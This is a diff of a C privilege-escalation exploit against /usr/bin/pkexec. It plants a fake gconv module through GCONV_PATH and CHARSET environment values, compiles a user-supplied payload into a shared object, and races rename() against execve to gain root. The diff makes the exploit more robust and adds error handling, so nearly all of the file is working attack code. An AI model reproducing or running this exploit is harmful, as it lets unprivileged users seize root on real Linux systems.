@@ -1,21 +1,18 @@
 #include <fcntl.h>
 #include <pthread.h>
-#include <signal.h>
 #include <stdatomic.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/file.h>
 #include <sys/stat.h>
-#include <sys/wait.h>
 #include <unistd.h>
 
 static char *pk_path = "/usr/bin/pkexec";
+static char *lock_file = "/tmp/privlock";
 static char *pk_args[] = {NULL};
 static char *pk_envs[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC",
                           NULL};
 
-pthread_mutex_t exec_mut;
-pthread_cond_t exec_cond;
 atomic_int halt = 0;
 
 void read_payload(char *payload_file, char **payload_contents) {
@@ -65,26 +62,41 @@ exit:
 
 void setup(char *payload_file) {
   FILE *fp = NULL;
+  FILE *pfp = NULL;
   char *pl_contents = NULL;
+
+  if (NULL == payload_file) {
+    fprintf(stderr, "[-] Payload file ptr null\n");
+    goto fail;
+  }
 
   read_payload(payload_file, &pl_contents);
 
   if (NULL == pl_contents) {
     fprintf(stderr, "[-] Unable to setup exploit\n");
-    exit(1);
+    goto fail;
   }
 
-  // remove existing file lock
-  system("rm -f /tmp/g2g");
+  // reset folder, dont care if these fail
+  remove(lock_file);
 
   // GCONV_PATH setup
-  mkdir("GCONV_PATH=.", 0700);
-  system("touch GCONV_PATH=./privesc");
-  system("chmod a+x GCONV_PATH=./privesc");
+  if ((0 != mkdir("GCONV_PATH=.", 0700)) ||
+      (NULL == fopen("GCONV_PATH=./privesc", "w+")) ||
+      (0 != chmod("GCONV_PATH=./privesc", S_IRWXU))) {
+
+    fprintf(stderr, "[-] Failed to create GCONV_PATH files\n");
+    goto fail;
+  }
 
   // GConv Module Setup
-  system("mkdir -p privesc");
-  system("echo 'module UTF-8// PRIVESC// privesc 2' > privesc/gconv-modules");
+  if ((0 != mkdir("privesc", 0700)) ||
+      (NULL == (pfp = fopen("privesc/gconv-modules", "w+")))) {
+    fprintf(stderr, "[-] Failed to create privesc files\n");
+    goto fail;
+  }
+  fprintf(pfp, "%s", "module UTF-8// PRIVESC// privesc 2");
+  fclose(pfp);
 
   // Malicious Module
   fp = fopen("privesc/privesc.c", "w");
@@ -92,7 +104,16 @@ void setup(char *payload_file) {
   fclose(fp);
   free(pl_contents);
 
-  system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c ");
+  if (0 !=
+      system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c")) {
+    fprintf(stderr, "[-] Failed to compile privesc\n");
+    goto fail;
+  }
+
+  return;
+
+fail:
+  exit(EXIT_FAILURE);
 }
 
 void *race() {
@@ -100,10 +121,12 @@ void *race() {
     rename("GCONV_PATH=./privesc", "GCONV_PATH=./race");
     rename("GCONV_PATH=./race", "GCONV_PATH=./privesc");
   }
+
+  return NULL;
 }
 
 void *pwn() {
-  int lfd = open("/tmp/g2g", O_CREAT);
+  int lfd = open("/tmp/privlock", O_CREAT);
 
   // simple file lock; payload grabs lock on good run
   for (; 0 == flock(lfd, LOCK_EX | LOCK_NB);) {
@@ -113,16 +136,16 @@ void *pwn() {
       if (0 == fork()) {
         execve(pk_path, pk_args, pk_envs);
       }
-      exit(EXIT_FAILURE);
+      exit(EXIT_SUCCESS);
     }
   }
 
   // stop race thread
-  // block while other poisned execve runs
+  // busywait while other payload runs
   halt = 1;
-  while (0 != flock(lfd, LOCK_EX)) {
-    usleep(1000);
-  }
+  flock(lfd, LOCK_EX);
+
+  return NULL;
 }
 
 int main(int argc, char *argv[]) {
@@ -138,14 +161,13 @@ int main(int argc, char *argv[]) {
 
   setup(argv[1]);
 
-  pthread_mutex_init(&exec_mut, NULL);
-  pthread_mutex_lock(&exec_mut);
-
   // start thread to cause race condition
   pthread_create(&race_id, NULL, race, NULL);
+  printf("[*] Started Race Thread\n");
 
   // race condition exploitation
   pthread_create(&pwn_id, NULL, pwn, NULL);
+  printf("[*] Trying to win race\n");
 
   // join threads
   pthread_join(pwn_id, NULL);
